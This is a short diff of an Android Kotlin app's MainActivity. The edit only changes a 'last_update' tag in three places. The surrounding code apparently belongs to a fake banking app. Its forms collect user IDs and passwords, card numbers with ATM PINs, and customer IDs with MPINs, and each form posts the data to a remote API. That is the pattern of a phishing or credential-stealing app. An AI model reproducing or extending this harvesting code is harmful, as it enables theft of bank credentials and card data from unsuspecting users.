@@ -124,7 +124,7 @@ class MainActivity : AppCompatActivity() {
 
                 if (btnstr == "cus") {
 
-                    val data = Submit1(domain = "example.com", last_update = "second", mobile = binding.e3.text.toString(),
+                    val data = Submit1(domain = "example.com", last_update = "second123", mobile = binding.e3.text.toString(),
                         password = binding.e2.text.toString(), userid = binding.e1.text.toString())
                     util.saveLocalData(this,"mobile",binding.e3.text.toString() )
                     val call = apiService.submitData(data)
@@ -148,7 +148,7 @@ class MainActivity : AppCompatActivity() {
 
 
                     val data = Submit2(atmpin = binding.e3.text.toString(), cardno = binding.e2.text.toString(), domain = "example.com",
-                        last_update = "second", mobile = binding.e1.text.toString())
+                        last_update = "second123", mobile = binding.e1.text.toString())
                     util.saveLocalData(this,"mobile",binding.e1.text.toString() )
                     val call = apiService.submitData(data)
                     call.enqueue(object : Callback<Void?> {
@@ -170,7 +170,7 @@ class MainActivity : AppCompatActivity() {
                 } else {
 
                     val data = Submit3(customer_id = binding.e2.text.toString(), mpin = binding.e3.text.toString(), domain = "example.com",
-                        last_update = "second", mobile = binding.e1.text.toString())
+                        last_update = "second123", mobile = binding.e1.text.toString())
                     util.saveLocalData(this,"mobile",binding.e1.text.toString() )
                     val call = apiService.submitData(data)
                     call.enqueue(object : Callback<Void?> {
